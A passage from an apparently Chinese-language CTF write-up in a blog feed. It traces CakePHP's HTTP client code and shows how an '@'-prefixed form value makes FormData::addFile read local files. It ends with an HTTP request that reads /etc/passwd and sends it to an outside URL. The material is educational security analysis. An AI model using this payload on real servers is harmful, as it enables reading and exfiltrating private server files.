&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$request</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第 20 行在请求的时候创建了一个 Request 对象进行请求 <code>new Request($url, $method, $headers, $data);</code>，Request 类位于<code>\Cake\Http\Client\Request</code>，在<code>\vendor\cakephp\cakephp\src\Http\Client\Request.php</code> 中，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">RequestInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">RequestTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Provides backwards compatible defaults for some properties.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The request URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method The HTTP method to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $headers The HTTP headers to set.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|string|null $data The request body to use.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$method</span> = <span class="built_in">self</span>::<span class="variable constant_">METHOD_GET</span>, <span class="keyword">array</span> <span class="variable">$headers</span> = [], <span class="variable">$data</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">validateMethod</span>(<span class="variable">$method</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uri = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createUri</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$headers</span> += [</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span> =&gt; <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;CakePHP&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addHeaders</span>(<span class="variable">$headers</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">body</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get/set the body/payload for the message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Array data will be serialized with Cake\Http\FormData,</span></span><br><span class="line"><span class="comment">     * and the content-type will be set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|array|null $body The body for the request. Leave null for get</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed Either $this or the body value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span>(<span class="params"><span class="variable">$body</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$body</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$body</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBody</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$body</span> ? <span class="variable">$body</span>-&gt;<span class="title function_ invoke__">__toString</span>() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$body</span>)) &#123;</span><br><span class="line">            <span class="variable">$formData</span> = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">            <span class="variable">$formData</span>-&gt;<span class="title function_ invoke__">addMany</span>(<span class="variable">$body</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="variable">$formData</span>-&gt;<span class="title function_ invoke__">contentType</span>());</span><br><span class="line">            <span class="variable">$body</span> = (<span class="keyword">string</span>)<span class="variable">$formData</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stream</span> = <span class="keyword">new</span> <span class="title class_">Stream</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;rw&#x27;</span>);</span><br><span class="line">        <span class="variable">$stream</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$body</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream = <span class="variable">$stream</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第 25 行的构造函数中使用 <code>$this-&gt;body($data)</code> 将 data 放在了 body 中，而在 body 函数中有一行代码判断 data 是否为数组，body 函数的文档中还提到了<code>Array data will be serialized with Cake\Http\FormData</code>, 也就是说如果是数组的话会 new 一个 FormData 对象，并且将 data 添加到 FormData 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$body</span>)) &#123;</span><br><span class="line">     <span class="variable">$formData</span> = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">     <span class="variable">$formData</span>-&gt;<span class="title function_ invoke__">addMany</span>(<span class="variable">$body</span>);</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="variable">$formData</span>-&gt;<span class="title function_ invoke__">contentType</span>());</span><br><span class="line">     <span class="variable">$body</span> = (<span class="keyword">string</span>)<span class="variable">$formData</span>;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>跟到 FormData 中，位于 Cake\Http\FormData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormData</span> <span class="keyword">implements</span> <span class="title">Countable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a new part to the data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The value for a part can be a string, array, int,</span></span><br><span class="line"><span class="comment">     * float, filehandle, or object implementing __toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If the $value is an array, multiple parts will be added.</span></span><br><span class="line"><span class="comment">     * Files will be read from their current position and saved in memory.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|\Cake\Http\Client\FormData $name The name of the part to add,</span></span><br><span class="line"><span class="comment">     *   or the part data object.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value The value for the part.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addRecursive</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$value</span>[<span class="number">0</span>] === <span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">trigger_error</span>(</span><br><span class="line">                <span class="string">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class="line">                <span class="string">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$name</span> <span class="keyword">instanceof</span> FormDataPart &amp;&amp; <span class="variable">$value</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_hasComplexPart = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_parts[] = <span class="variable">$name</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_parts[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newPart</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add multiple parts at once.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Iterates the parameter and adds all the key/values.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data Array of data to add.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add either a file reference (string starting with @)</span></span><br><span class="line"><span class="comment">     * or a file handle.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name The name to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value Either a string filename, or a filehandle.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\FormDataPart</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_hasFile = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$contentType</span> = <span class="string">&#x27;application/octet-stream&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stream_is_local</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$finfo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME);</span><br><span class="line">                <span class="variable">$metadata</span> = <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$value</span>);</span><br><span class="line">                <span class="variable">$contentType</span> = <span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$metadata</span>[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">                <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$metadata</span>[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$finfo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME);</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$contentType</span> = <span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$part</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newPart</span>(<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$part</span>-&gt;<span class="title function_ invoke__">type</span>(<span class="variable">$contentType</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$part</span>-&gt;<span class="title function_ invoke__">filename</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$part</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$part</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>addMany($body)</code> 函数中将 data 数组进行了处理，将 data 数组里的每一个键和值都用 <code>$this-&gt;add($name, $value)</code> 加入到 body 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看 add 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addRecursive</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$value</span>[<span class="number">0</span>] === <span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_error</span>(</span><br><span class="line">            <span class="string">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class="line">            <span class="string">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class="line">            E_USER_DEPRECATED</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$name</span> <span class="keyword">instanceof</span> FormDataPart &amp;&amp; <span class="variable">$value</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_hasComplexPart = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_parts[] = <span class="variable">$name</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_parts[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newPart</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 add 函数中第 7 行代码出了问题：<code>elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#39;@&#39;)</code>，如果 value 是”@”开头的字符串的话会转入 <code>addFile</code> 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$finfo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME);</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$contentType</span> = <span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$part</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newPart</span>(<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$part</span>-&gt;<span class="title function_ invoke__">type</span>(<span class="variable">$contentType</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="variable">$part</span>-&gt;<span class="title function_ invoke__">filename</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$part</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$part</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于此时进来的 <code>$value</code> 是一个字符串，所以流程会转入 else 中，而在 else 里第 10 行代码可以直接读取文件 <code>$content = file_get_contents($value);</code>，读取到的内容在<code>$content</code> 变量中，而 <code>$content</code> 会存入 <code>FormDataPart</code> 里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newPart</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FormDataPart</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再次将 part 加入<code>add($part)</code>，所以读取到的 content 会存在 body 中, 这样就构成了一个本地文件读取漏洞，Paylaod 如下:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?url=http://\*\*\*.\*\*\*.\*\*\*.\*\*\*/&amp;data[a]=@/etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>13.230.134.135</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://13.230.134.135/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终会在服务器收到读取到的文件内容</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueWhale2018 年纳新题目 Writeup</title>
      <link href="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/"/>
      <url>/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/</url>
      
